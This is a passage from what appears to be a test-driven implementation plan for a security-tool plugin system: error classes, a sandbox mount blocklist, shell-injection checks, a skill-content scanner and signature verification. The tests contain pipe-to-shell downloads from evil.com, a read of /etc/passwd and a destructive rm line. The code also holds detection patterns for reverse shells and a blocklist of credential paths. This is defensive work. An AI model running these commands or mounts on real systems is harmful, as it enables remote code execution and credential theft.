        from opentools_plugin_core.errors import PluginError

        err = PluginError("something broke")
        assert isinstance(err, Exception)
        assert "something broke" in str(err)

    def test_error_with_hint(self):
        from opentools_plugin_core.errors import PluginError

        err = PluginError(
            "Plugin not found",
            hint="opentools plugin search wifi",
        )
        assert err.message == "Plugin not found"
        assert err.hint == "opentools plugin search wifi"

    def test_error_with_detail(self):
        from opentools_plugin_core.errors import PluginError

        err = PluginError(
            "Install failed",
            detail="git clone returned exit code 128",
            hint="Check your network connection",
        )
        assert err.detail == "git clone returned exit code 128"

    def test_not_found_error(self):
        from opentools_plugin_core.errors import PluginNotFoundError

        err = PluginNotFoundError("wifi-hacking")
        assert isinstance(err, Exception)
        assert "wifi-hacking" in str(err)

    def test_install_error(self):
        from opentools_plugin_core.errors import PluginInstallError

        err = PluginInstallError("SHA256 mismatch")
        assert isinstance(err, Exception)

    def test_sandbox_violation_error(self):
        from opentools_plugin_core.errors import SandboxViolationError

        err = SandboxViolationError(
            "Undeclared capability: SYS_ADMIN",
            hint="Declare SYS_ADMIN in sandbox.capabilities",
        )
        assert "SYS_ADMIN" in err.message

    def test_resolve_error(self):
        from opentools_plugin_core.errors import DependencyResolveError

        err = DependencyResolveError("Circular dependency detected")
        assert isinstance(err, Exception)

    def test_verification_error(self):
        from opentools_plugin_core.errors import VerificationError

        err = VerificationError("Signature invalid")
        assert isinstance(err, Exception)

    def test_registry_error(self):
        from opentools_plugin_core.errors import RegistryError

        err = RegistryError(
            "Catalog fetch failed",
            detail="HTTP 503",
            hint="opentools plugin search --refresh",
        )
        assert err.hint == "opentools plugin search --refresh"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_errors.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.errors'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/errors.py
"""Plugin error hierarchy with user-facing messages and hints."""

from __future__ import annotations


class PluginError(Exception):
    """Base error for all plugin operations.

    Every fixable error includes a ``hint`` with the exact CLI command
    the user should run to resolve the problem.
    """

    def __init__(
        self,
        message: str,
        detail: str = "",
        hint: str = "",
    ) -> None:
        self.message = message
        self.detail = detail
        self.hint = hint
        super().__init__(message)


class PluginNotFoundError(PluginError):
    """Plugin not found in any registry."""

    def __init__(self, name: str, **kwargs):
        super().__init__(
            f"Plugin not found: {name}",
            hint=kwargs.pop("hint", f"opentools plugin search {name}"),
            **kwargs,
        )


class PluginInstallError(PluginError):
    """Install pipeline failure."""


class SandboxViolationError(PluginError):
    """Compose fragment or manifest violates sandbox policy."""


class DependencyResolveError(PluginError):
    """Dependency resolution failed (conflict, cycle, missing)."""


class VerificationError(PluginError):
    """Sigstore or SHA256 verification failed."""


class RegistryError(PluginError):
    """Registry communication or catalog parsing error."""


class IntegrityError(PluginError):
    """Installed file integrity check failed."""
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_errors.py -x -v`
Expected: PASS (all 9 tests)

- [ ] **Step 5: Commit**

---

### Task 6: Sandbox Policy

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/sandbox.py`
- Test: `packages/plugin-core/tests/test_sandbox.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_sandbox.py
"""Tests for sandbox policy: mount blocklist, capability checks, org policy."""

import pytest


class TestMountBlocklist:
    def test_docker_socket_blocked(self):
        from opentools_plugin_core.sandbox import check_volumes

        violations = check_volumes(["/var/run/docker.sock:/var/run/docker.sock"])
        assert len(violations) >= 1
        assert any("docker.sock" in v.path for v in violations)

    def test_root_mount_blocked(self):
        from opentools_plugin_core.sandbox import check_volumes

        violations = check_volumes(["/:/host"])
        assert len(violations) >= 1

    def test_etc_shadow_blocked(self):
        from opentools_plugin_core.sandbox import check_volumes

        violations = check_volumes(["/etc/shadow:/etc/shadow:ro"])
        assert len(violations) >= 1

    def test_safe_volume_allowed(self):
        from opentools_plugin_core.sandbox import check_volumes

        violations = check_volumes(["/data/scans:/scans:ro"])
        assert violations == []

    def test_ssh_blocked(self):
        from opentools_plugin_core.sandbox import check_volumes

        home = "~/.ssh/:/root/.ssh/"
        violations = check_volumes([home])
        assert len(violations) >= 1

    def test_proc_sys_blocked(self):
        from opentools_plugin_core.sandbox import check_volumes

        for path in ["/proc:/proc", "/sys:/sys"]:
            violations = check_volumes([path])
            assert len(violations) >= 1, f"{path} should be blocked"


class TestCapabilityCheck:
    def test_undeclared_capability_flagged(self):
        from opentools_plugin_core.sandbox import check_capabilities

        # Compose has NET_RAW but manifest only declares NET_ADMIN
        violations = check_capabilities(
            compose_caps=["NET_RAW", "NET_ADMIN"],
            declared_caps=["NET_ADMIN"],
        )
        assert len(violations) == 1
        assert "NET_RAW" in violations[0].detail

    def test_all_declared_passes(self):
        from opentools_plugin_core.sandbox import check_capabilities

        violations = check_capabilities(
            compose_caps=["NET_RAW"],
            declared_caps=["NET_RAW", "NET_ADMIN"],
        )
        assert violations == []


class TestComposeValidation:
    def test_privileged_flagged(self):
        from opentools_plugin_core.sandbox import validate_compose_service

        service = {"privileged": True, "image": "test:1.0"}
        violations = validate_compose_service(service, declared_caps=[])
        assert any(v.severity == "red" for v in violations)

    def test_network_mode_host_flagged(self):
        from opentools_plugin_core.sandbox import validate_compose_service

        service = {"network_mode": "host", "image": "test:1.0"}
        violations = validate_compose_service(
            service, declared_caps=[], declared_network_mode="host"
        )
        assert any(v.severity == "yellow" for v in violations)

    def test_undeclared_network_mode_host_is_red(self):
        from opentools_plugin_core.sandbox import validate_compose_service

        service = {"network_mode": "host", "image": "test:1.0"}
        violations = validate_compose_service(
            service, declared_caps=[], declared_network_mode=None
        )
        assert any(v.severity == "red" for v in violations)


class TestOrgPolicy:
    def test_blocked_capability_rejected(self):
        from opentools_plugin_core.sandbox import OrgPolicy, apply_org_policy

        policy = OrgPolicy(blocked_capabilities=["SYS_ADMIN", "SYS_PTRACE"])
        violations = apply_org_policy(
            policy, declared_caps=["SYS_PTRACE"], network_mode=None
        )
        assert len(violations) == 1
        assert "SYS_PTRACE" in violations[0].detail

    def test_blocked_network_mode_rejected(self):
        from opentools_plugin_core.sandbox import OrgPolicy, apply_org_policy

        policy = OrgPolicy(blocked_network_modes=["host"])
        violations = apply_org_policy(
            policy, declared_caps=[], network_mode="host"
        )
        assert len(violations) == 1

    def test_empty_policy_passes(self):
        from opentools_plugin_core.sandbox import OrgPolicy, apply_org_policy

        policy = OrgPolicy()
        violations = apply_org_policy(
            policy, declared_caps=["NET_RAW"], network_mode="host"
        )
        assert violations == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_sandbox.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.sandbox'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/sandbox.py
"""Container sandbox policy: mount blocklist, capability checks, org policy."""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import PurePosixPath
from typing import Optional


# ---------------------------------------------------------------------------
# Violation dataclass
# ---------------------------------------------------------------------------


@dataclass
class Violation:
    severity: str  # "red" | "yellow" | "info"
    message: str
    detail: str = ""
    path: str = ""


# ---------------------------------------------------------------------------
# Mount blocklist
# ---------------------------------------------------------------------------

_BLOCKED_MOUNTS: list[str] = [
    "/var/run/docker.sock",
    "/",
    "/etc/shadow",
    "/etc/passwd",
    "/proc",
    "/sys",
    "~/.ssh",
    "~/.opentools/plugins.db",
]


def _normalize_mount_source(source: str) -> str:
    """Normalize a volume source path for comparison."""
    source = source.rstrip("/")
    if source.startswith("~"):
        # Expand tilde conceptually for matching
        pass
    return source


def check_volumes(volumes: list[str]) -> list[Violation]:
    """Check volume mounts against the blocklist."""
    violations: list[Violation] = []
    for vol in volumes:
        # Parse "source:dest" or "source:dest:mode"
        parts = vol.split(":")
        source = parts[0].rstrip("/")
        for blocked in _BLOCKED_MOUNTS:
            blocked_norm = blocked.rstrip("/")
            # Exact match or source is under blocked path
            if source == blocked_norm or source.startswith(blocked_norm + "/"):
                violations.append(Violation(
                    severity="red",
                    message=f"Blocked volume mount: {blocked}",
                    detail=f"Volume '{vol}' maps blocked path '{blocked}'",
                    path=source,
                ))
                break
            # Handle tilde paths
            if blocked.startswith("~") and source.startswith("~"):
                if source == blocked_norm or source.startswith(blocked_norm + "/"):
                    violations.append(Violation(
                        severity="red",
                        message=f"Blocked volume mount: {blocked}",
                        detail=f"Volume '{vol}' maps blocked path '{blocked}'",
                        path=source,
                    ))
                    break
    return violations


# ---------------------------------------------------------------------------
# Capability checks
# ---------------------------------------------------------------------------


def check_capabilities(
    compose_caps: list[str],
    declared_caps: list[str],
) -> list[Violation]:
    """Flag capabilities present in compose but not declared in manifest."""
    declared_set = set(declared_caps)
    violations: list[Violation] = []
    for cap in compose_caps:
        if cap not in declared_set:
            violations.append(Violation(
                severity="red",
                message=f"Undeclared capability: {cap}",
                detail=f"Compose uses cap_add '{cap}' not declared in manifest sandbox.capabilities",
            ))
    return violations


# ---------------------------------------------------------------------------
# Compose service validation
# ---------------------------------------------------------------------------


def validate_compose_service(
    service: dict,
    declared_caps: list[str],
    declared_network_mode: Optional[str] = None,
) -> list[Violation]:
    """Validate a single compose service dict against sandbox rules."""
    violations: list[Violation] = []

    # Privileged mode
    if service.get("privileged"):
        violations.append(Violation(
            severity="red",
            message="Container runs in privileged mode",
            detail="'privileged: true' grants full host access",
        ))

    # Network mode
    net_mode = service.get("network_mode")
    if net_mode == "host":
        if declared_network_mode == "host":
            violations.append(Violation(
                severity="yellow",
                message="Container uses host networking",
                detail="network_mode: host bypasses Docker network isolation",
            ))
        else:
            violations.append(Violation(
                severity="red",
                message="Undeclared host networking",
                detail="Compose uses network_mode: host but manifest does not declare it",
            ))

    # Volume mounts
    vols = service.get("volumes", [])
    if vols:
        vol_strings = [v if isinstance(v, str) else v.get("source", "") for v in vols]
        violations.extend(check_volumes(vol_strings))

    # Capabilities
    caps = service.get("cap_add", [])
    if caps:
        violations.extend(check_capabilities(caps, declared_caps))

    return violations


# ---------------------------------------------------------------------------
# Org policy
# ---------------------------------------------------------------------------


@dataclass
class OrgPolicy:
    """Organization-level sandbox policy overrides."""

    blocked_capabilities: list[str] = field(default_factory=list)
    blocked_network_modes: list[str] = field(default_factory=list)
    require_egress_allowlist: bool = False
    max_volume_mounts: Optional[int] = None
    enforced_by: str = ""


def apply_org_policy(
    policy: OrgPolicy,
    declared_caps: list[str],
    network_mode: Optional[str],
) -> list[Violation]:
    """Check declared sandbox config against org policy."""
    violations: list[Violation] = []

    for cap in declared_caps:
        if cap in policy.blocked_capabilities:
            violations.append(Violation(
                severity="red",
                message=f"Org policy blocks capability: {cap}",
                detail=f"Capability '{cap}' is blocked by org policy"
                       + (f" ({policy.enforced_by})" if policy.enforced_by else ""),
            ))

    if network_mode and network_mode in policy.blocked_network_modes:
        violations.append(Violation(
            severity="red",
            message=f"Org policy blocks network mode: {network_mode}",
            detail=f"Network mode '{network_mode}' is blocked by org policy",
        ))

    return violations


# ---------------------------------------------------------------------------
# Seccomp profile mapping
# ---------------------------------------------------------------------------

CAPABILITY_SECCOMP_MAP: dict[str, str] = {
    "NET_RAW": "profiles/net-raw.json",
    "NET_ADMIN": "profiles/net-admin.json",
    "SYS_PTRACE": "profiles/ptrace.json",
}


# ---------------------------------------------------------------------------
# Default security profile
# ---------------------------------------------------------------------------

DEFAULT_SECURITY: dict = {
    "security_opt": ["no-new-privileges:true"],
    "read_only": True,
    "tmpfs": ["/tmp:size=256m"],
    "mem_limit": "2g",
    "cpus": 2.0,
    "pids_limit": 256,
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_sandbox.py -x -v`
Expected: PASS (all 13 tests)

- [ ] **Step 5: Commit**

---

### Task 7: Recipe Command Enforcement

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/enforcement.py`
- Test: `packages/plugin-core/tests/test_enforcement.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_enforcement.py
"""Tests for recipe command enforcement: shlex parsing, shell op rejection."""

import pytest


class TestShellOperatorRejection:
    @pytest.mark.parametrize("op", [";", "&&", "||", "|", ">", ">>", "<", "$(", "`"])
    def test_shell_operator_rejected(self, op):
        from opentools_plugin_core.enforcement import validate_command

        cmd = f"docker exec nmap-mcp nmap -sV target {op} echo pwned"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1
        assert any(v.severity == "red" for v in violations)

    def test_clean_command_accepted(self):
        from opentools_plugin_core.enforcement import validate_command

        cmd = "docker exec nmap-mcp nmap -sV --top-ports 1000 192.168.1.0/24"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert violations == []


class TestContainerScoping:
    def test_undeclared_container_rejected(self):
        from opentools_plugin_core.enforcement import validate_command

        cmd = "docker exec evil-container cat /etc/passwd"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1
        assert any("evil-container" in v.message for v in violations)

    def test_declared_container_allowed(self):
        from opentools_plugin_core.enforcement import validate_command

        cmd = "docker exec aircrack-mcp aircrack-ng capture.cap"
        violations = validate_command(
            cmd, allowed_containers={"aircrack-mcp", "nmap-mcp"}
        )
        assert violations == []

    def test_non_docker_exec_rejected(self):
        from opentools_plugin_core.enforcement import validate_command

        cmd = "curl http://evil.com/shell.sh"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1

    def test_docker_exec_with_flags(self):
        from opentools_plugin_core.enforcement import validate_command

        cmd = "docker exec -it nmap-mcp nmap -sV target"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert violations == []


class TestExtractContainerName:
    def test_simple_extract(self):
        from opentools_plugin_core.enforcement import extract_container_name

        assert extract_container_name(["nmap-mcp", "nmap", "-sV"]) == "nmap-mcp"

    def test_extract_skips_flags(self):
        from opentools_plugin_core.enforcement import extract_container_name

        assert extract_container_name(["-it", "nmap-mcp", "cmd"]) == "nmap-mcp"

    def test_extract_skips_dash_e(self):
        from opentools_plugin_core.enforcement import extract_container_name

        assert extract_container_name(["-e", "FOO=bar", "nmap-mcp", "cmd"]) == "nmap-mcp"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_enforcement.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.enforcement'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/enforcement.py
"""Recipe command structural validation: shlex parsing, container scoping."""

from __future__ import annotations

import shlex
from dataclasses import dataclass


@dataclass
class Violation:
    severity: str  # "red" | "yellow" | "info"
    message: str
    detail: str = ""


SHELL_OPERATORS = {";", "&&", "||", "|", ">", ">>", "<", "$(", "`"}

# Flags that consume the next token as a value
_VALUE_FLAGS = {"-e", "--env", "-w", "--workdir", "-u", "--user"}

# Flags that are standalone (no value)
_STANDALONE_FLAGS = {"-i", "-t", "-it", "-d", "--detach", "--privileged"}


def extract_container_name(tokens: list[str]) -> str | None:
    """Extract the container name from docker exec args (after 'docker exec').

    Skips flags like -it, -e FOO=bar, etc. The first non-flag token is the
    container name.
    """
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in _VALUE_FLAGS:
            i += 2  # skip flag + value
            continue
        if tok.startswith("-"):
            # Check for combined flags like -it or --flag=value
            if "=" in tok:
                i += 1
                continue
            i += 1
            continue
        return tok
        i += 1
    return None


def validate_command(
    command: str,
    allowed_containers: set[str],
) -> list[Violation]:
    """Validate a recipe command for marketplace plugins.

    Rules:
    1. No shell metacharacters (;, &&, ||, |, >, >>, <, $(, `)
    2. Must be ``docker exec <container> <command>`` format
    3. Container must be in the allowed set
    """
    violations: list[Violation] = []

    # Check shell operators in raw command string
    for op in SHELL_OPERATORS:
        if op in command:
            violations.append(Violation(
                severity="red",
                message=f"Shell operator '{op}' not allowed in marketplace recipes",
                detail=f"Command contains '{op}' which could enable shell injection",
            ))

    if violations:
        return violations  # Don't bother parsing further

    try:
        tokens = shlex.split(command)
    except ValueError as e:
        return [Violation(
            severity="red",
            message="Command parsing failed",
            detail=str(e),
        )]

    if len(tokens) < 3 or tokens[0:2] != ["docker", "exec"]:
        return [Violation(
            severity="red",
            message="Must use 'docker exec <container>' format",
            detail=f"Command starts with '{' '.join(tokens[:2])}' instead of 'docker exec'",
        )]

    container = extract_container_name(tokens[2:])
    if container is None:
        return [Violation(
            severity="red",
            message="Could not determine container name",
            detail="No non-flag token found after 'docker exec'",
        )]

    if container not in allowed_containers:
        return [Violation(
            severity="red",
            message=f"Undeclared container: {container}",
            detail=f"Container '{container}' is not in the plugin's allowed set: {allowed_containers}",
        )]

    return []
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_enforcement.py -x -v`
Expected: PASS (all 12 tests)

- [ ] **Step 5: Commit**

---

### Task 8: Skill Content Advisor

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/content_advisor.py`
- Test: `packages/plugin-core/tests/test_content_advisor.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_content_advisor.py
"""Tests for skill content advisory scanner."""

import pytest


class TestContentAdvisor:
    def test_pipe_to_shell_flagged(self):
        from opentools_plugin_core.content_advisor import scan_skill_content

        content = "Run: curl https://evil.com/script.sh | bash"
        warnings = scan_skill_content(content)
        assert len(warnings) >= 1
        assert any("pipe" in w.pattern.lower() or "shell" in w.pattern.lower()
                    for w in warnings)

    def test_base64_decode_exec_flagged(self):
        from opentools_plugin_core.content_advisor import scan_skill_content

        content = "echo ZXZpbCBjb21tYW5k | base64 -d | sh"
        warnings = scan_skill_content(content)
        assert len(warnings) >= 1

    def test_chmod_777_flagged(self):
        from opentools_plugin_core.content_advisor import scan_skill_content

        content = "chmod 777 /usr/local/bin/tool"
        warnings = scan_skill_content(content)
        assert len(warnings) >= 1

    def test_clean_content_no_warnings(self):
        from opentools_plugin_core.content_advisor import scan_skill_content

        content = """# WiFi Scanning Skill

Use nmap to scan for wireless access points.

## Steps
1. Configure the wireless adapter
2. Run the scan command
"""
        warnings = scan_skill_content(content)
        assert warnings == []

    def test_sudo_flagged(self):
        from opentools_plugin_core.content_advisor import scan_skill_content

        content = "sudo rm -rf /important/data"
        warnings = scan_skill_content(content)
        assert len(warnings) >= 1

    def test_returns_advisory_objects(self):
        from opentools_plugin_core.content_advisor import scan_skill_content, Advisory

        content = "wget http://evil.com/shell.sh | bash"
        warnings = scan_skill_content(content)
        assert all(isinstance(w, Advisory) for w in warnings)
        assert all(hasattr(w, "line_number") for w in warnings)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_content_advisor.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/content_advisor.py
"""Advisory skill content scanner: regex red-flag detection.

These are WARNINGS, not hard blocks. Legitimate security skills contain
offensive commands. The enforcement boundary is the container sandbox.
"""

from __future__ import annotations

import re
from dataclasses import dataclass


@dataclass
class Advisory:
    """A single advisory warning from content scanning."""

    pattern: str
    message: str
    line_number: int
    line_content: str
    severity: str = "warning"  # "warning" | "info"


# Each tuple: (compiled regex, pattern name, message)
_RED_FLAGS: list[tuple[re.Pattern, str, str]] = [
    (
        re.compile(r"(curl|wget)\s+.+\|\s*(ba)?sh", re.IGNORECASE),
        "pipe-to-shell",
        "Downloads and pipes directly to shell interpreter",
    ),
    (
        re.compile(r"base64\s+(-d|--decode)\s*\|\s*(ba)?sh", re.IGNORECASE),
        "base64-decode-exec",
        "Decodes base64 and executes via shell",
    ),
    (
        re.compile(r"chmod\s+777\b", re.IGNORECASE),
        "chmod-777",
        "Sets world-writable permissions",
    ),
    (
        re.compile(r"\bsudo\b", re.IGNORECASE),
        "sudo-usage",
        "Uses sudo for privilege escalation",
    ),
    (
        re.compile(r"eval\s*\(.*\$\(", re.IGNORECASE),
        "eval-subshell",
        "Eval with command substitution",
    ),
    (
        re.compile(r"\bpython\s+-c\s+.*exec\(", re.IGNORECASE),
        "python-exec",
        "Python one-liner with exec()",
    ),
    (
        re.compile(r"nc\s+-[el]", re.IGNORECASE),
        "netcat-listener",
        "Netcat in listen mode (potential reverse shell)",
    ),
    (
        re.compile(r"/dev/(tcp|udp)/", re.IGNORECASE),
        "bash-net-redirect",
        "Bash network redirection (/dev/tcp or /dev/udp)",
    ),
]


def scan_skill_content(content: str) -> list[Advisory]:
    """Scan skill markdown/text for red-flag patterns.

    Returns a list of advisory warnings. These are informational --
    legitimate security skills often contain offensive commands.
    """
    advisories: list[Advisory] = []
    for line_num, line in enumerate(content.splitlines(), start=1):
        for pattern, name, message in _RED_FLAGS:
            if pattern.search(line):
                advisories.append(Advisory(
                    pattern=name,
                    message=message,
                    line_number=line_num,
                    line_content=line.strip(),
                ))
    return advisories
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_content_advisor.py -x -v`
Expected: PASS (all 6 tests)

- [ ] **Step 5: Commit**

---

### Task 9: Compose Generator

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/compose.py`
- Test: `packages/plugin-core/tests/test_compose.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_compose.py
"""Tests for per-plugin Docker Compose project generation."""

import pytest


class TestComposeGenerator:
    def test_single_container_basic(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest_dict = {
            "name": "wifi-hacking",
            "version": "1.0.0",
            "description": "WiFi tools",
            "author": {"name": "tester"},
            "license": "MIT",
            "min_opentools_version": "0.3.0",
            "tags": ["wifi"],
            "domain": "pentest",
            "provides": {
                "skills": [],
                "recipes": [],
                "containers": [{
                    "name": "aircrack-mcp",
                    "compose_fragment": "containers/aircrack-mcp.yaml",
                    "image": "ghcr.io/someone/aircrack-mcp:1.2.0",
                    "profile": "pentest",
                }],
            },
        }
        manifest = PluginManifest(**manifest_dict)
        compose = generate_compose(manifest, hub_network="mcp-security-hub_default")

        assert "services" in compose
        assert "aircrack-mcp" in compose["services"]
        svc = compose["services"]["aircrack-mcp"]
        assert svc["image"] == "ghcr.io/someone/aircrack-mcp:1.2.0"

    def test_sandbox_defaults_injected(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest = PluginManifest(
            name="test-plugin", version="1.0.0", description="Test",
            author={"name": "t"}, domain="pentest", tags=[],
            provides={"containers": [{
                "name": "test-mcp", "compose_fragment": "c.yaml",
                "image": "test:1.0",
            }]},
        )
        compose = generate_compose(manifest, hub_network="hub_default")
        svc = compose["services"]["test-mcp"]

        assert "no-new-privileges:true" in svc.get("security_opt", [])
        assert svc.get("read_only") is True
        assert svc.get("pids_limit") == 256

    def test_plugin_network_created(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest = PluginManifest(
            name="my-plugin", version="1.0.0", description="Test",
            author={"name": "t"}, domain="pentest", tags=[],
            provides={"containers": [{
                "name": "svc", "compose_fragment": "c.yaml",
                "image": "img:1.0",
            }]},
        )
        compose = generate_compose(manifest, hub_network="hub_default")

        assert "networks" in compose
        nets = compose["networks"]
        assert "plugin-net" in nets
        assert nets["plugin-net"]["name"] == "opentools-plugin-my-plugin"

    def test_hub_network_external(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest = PluginManifest(
            name="p", version="1.0.0", description="T",
            author={"name": "t"}, domain="pentest", tags=[],
            provides={"containers": [{
                "name": "s", "compose_fragment": "c.yaml", "image": "i:1",
            }]},
            requires={"containers": ["nmap-mcp"]},
        )
        compose = generate_compose(manifest, hub_network="mcp-security-hub_default")

        assert "hub" in compose["networks"]
        assert compose["networks"]["hub"]["external"] is True
        assert compose["networks"]["hub"]["name"] == "mcp-security-hub_default"

    def test_labels_added(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest = PluginManifest(
            name="labeled", version="2.0.0", description="T",
            author={"name": "t"}, domain="pentest", tags=[],
            provides={"containers": [{
                "name": "svc", "compose_fragment": "c.yaml", "image": "i:1",
            }]},
        )
        compose = generate_compose(manifest, hub_network="hub")
        labels = compose["services"]["svc"]["labels"]
        assert labels["com.opentools.plugin"] == "labeled"
        assert labels["com.opentools.version"] == "2.0.0"
        assert labels["com.opentools.sandbox"] == "enforced"

    def test_no_containers_returns_empty(self):
        from opentools_plugin_core.compose import generate_compose
        from opentools_plugin_core.models import PluginManifest

        manifest = PluginManifest(
            name="no-containers", version="1.0.0", description="T",
            author={"name": "t"}, domain="pentest", tags=[],
        )
        compose = generate_compose(manifest, hub_network="hub")
        assert compose is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_compose.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/compose.py
"""Generate per-plugin Docker Compose projects with sandbox injection."""

from __future__ import annotations

from typing import Any, Optional

from opentools_plugin_core.models import PluginManifest
from opentools_plugin_core.sandbox import DEFAULT_SECURITY


def generate_compose(
    manifest: PluginManifest,
    hub_network: str = "mcp-security-hub_default",
) -> dict[str, Any] | None:
    """Generate a compose dict for a plugin's containers.

    Returns None if the plugin provides no containers.
    """
    if not manifest.provides.containers:
        return None

    services: dict[str, Any] = {}
    networks: dict[str, Any] = {
        "plugin-net": {
            "name": f"opentools-plugin-{manifest.name}",
        },
    }

    # Add hub network if plugin requires external containers
    needs_hub = bool(manifest.requires.containers)
    service_networks = ["plugin-net"]
    if needs_hub:
        networks["hub"] = {
            "name": hub_network,
            "external": True,
        }
        service_networks.append("hub")

    for container in manifest.provides.containers:
        svc: dict[str, Any] = {
            "image": container.image,
            "networks": list(service_networks),
            "labels": {
                "com.opentools.plugin": manifest.name,
                "com.opentools.version": manifest.version,
                "com.opentools.sandbox": "enforced",
            },
        }

        # Inject sandbox defaults
        svc.update(DEFAULT_SECURITY)

        # Apply declared capabilities
        if manifest.sandbox.capabilities:
            svc["cap_add"] = list(manifest.sandbox.capabilities)

        # Apply declared network mode
        if manifest.sandbox.network_mode:
            svc["network_mode"] = manifest.sandbox.network_mode

        # Apply declared volumes
        if manifest.sandbox.volumes:
            svc["volumes"] = list(manifest.sandbox.volumes)

        services[container.name] = svc

    return {
        "version": "3.8",
        "services": services,
        "networks": networks,
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_compose.py -x -v`
Expected: PASS (all 6 tests)

- [ ] **Step 5: Commit**

---

### Task 10: Sigstore Verification

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/verify.py`
- Test: `packages/plugin-core/tests/test_verify.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_verify.py
"""Tests for sigstore verification (mocked -- no real signatures in unit tests)."""

import pytest


class TestSHA256Verification:
    def test_matching_hash_passes(self):
        from opentools_plugin_core.verify import verify_sha256

        data = b"known content"
        import hashlib
        expected = hashlib.sha256(data).hexdigest()
        # Should not raise
        verify_sha256(data, expected)

    def test_mismatched_hash_raises(self):
        from opentools_plugin_core.verify import verify_sha256
        from opentools_plugin_core.errors import VerificationError

        with pytest.raises(VerificationError, match="SHA256 mismatch"):
            verify_sha256(b"content", "0000" * 16)


class TestSigstoreVerify:
    def test_verify_bundle_returns_result(self):
        """Sigstore verification is wrapped in a try/except for missing lib."""
        from opentools_plugin_core.verify import verify_sigstore_bundle

        result = verify_sigstore_bundle(
            artifact_path="/fake/path",
            bundle_path="/fake/path.sigstore.bundle",
            expected_identity="test@users.noreply.github.com",
        )
        # Without real sigstore installed, should return a failure result
        assert result.verified is False or result.verified is True
        assert hasattr(result, "error")

    def test_verify_result_model(self):
        from opentools_plugin_core.verify import VerifyResult

        r = VerifyResult(verified=True, identity="someone@x.com", error="")
        assert r.verified is True

        r2 = VerifyResult(verified=False, identity="", error="sigstore not installed")
        assert r2.verified is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_verify.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/verify.py
"""Sigstore signature and SHA256 verification."""

from __future__ import annotations

import hashlib
from dataclasses import dataclass
from pathlib import Path

from opentools_plugin_core.errors import VerificationError


@dataclass
class VerifyResult:
    """Result of a signature verification attempt."""

    verified: bool
    identity: str = ""
    error: str = ""


def verify_sha256(data: bytes, expected_hash: str) -> None:
    """Verify SHA256 hash of data. Raises VerificationError on mismatch."""
    actual = hashlib.sha256(data).hexdigest()
    if actual != expected_hash:
        raise VerificationError(
            "SHA256 mismatch",
            detail=f"Expected {expected_hash[:16]}..., got {actual[:16]}...",
            hint="The plugin content may have been tampered with. "
                 "Try reinstalling: opentools plugin install --force <name>",
        )


def verify_sigstore_bundle(
    artifact_path: str,
    bundle_path: str,
    expected_identity: str,
) -> VerifyResult:
    """Verify a sigstore bundle against an artifact.

    Falls back gracefully if sigstore is not installed.
    """
    try:
        from sigstore.verify import Verifier
        from sigstore.verify.policy import Identity

        verifier = Verifier.production()
        identity = Identity(
            identity=expected_identity,
            issuer="https://accounts.google.com",
        )

        artifact = Path(artifact_path)
        bundle = Path(bundle_path)

        if not artifact.exists():
            return VerifyResult(
                verified=False, error=f"Artifact not found: {artifact_path}"
